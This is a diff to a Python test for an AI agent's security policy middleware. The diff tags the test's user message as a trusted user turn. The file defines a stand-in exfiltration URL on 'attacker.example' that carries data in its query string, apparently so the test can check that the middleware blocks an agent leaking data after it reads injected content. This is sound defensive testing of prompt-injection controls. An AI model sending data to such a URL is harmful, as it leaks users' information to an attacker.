@@ -21,6 +21,8 @@ from langchain_core.language_models.fake_chat_models import GenericFakeChatModel
 from langchain_core.messages import AIMessage, HumanMessage
 from langchain_core.tools import tool
 
+from omniharness.agents.turns import mark_user_turn
+
 EXFIL_URL = "https://attacker.example/c?d=T-3%20acquire%20Acme"
 FETCHED: list[str] = []
 
@@ -57,7 +59,9 @@ def _run(gateway, steps, thread):
     FETCHED.clear()
     model = _Fake(messages=iter([*steps, *[AIMessage(content="Done.")] * 6]))
     agent = create_agent(model=model, tools=[web_fetch, web_search, read_file], middleware=[build_policy_middleware(get_app_config())])
-    agent.invoke({"messages": [HumanMessage(content="look this up")]}, config={"configurable": {"thread_id": thread}}, context={"thread_id": thread, "user_id": gateway.user_id})
+    # [rebase edit] The gateway tags the person's own message (security baseline:
+    # an untagged human message is not a user turn, so the turn would start tainted).
+    agent.invoke({"messages": [mark_user_turn(HumanMessage(content="look this up"))]}, config={"configurable": {"thread_id": thread}}, context={"thread_id": thread, "user_id": gateway.user_id})
 
 
 def _call(name, args, i):
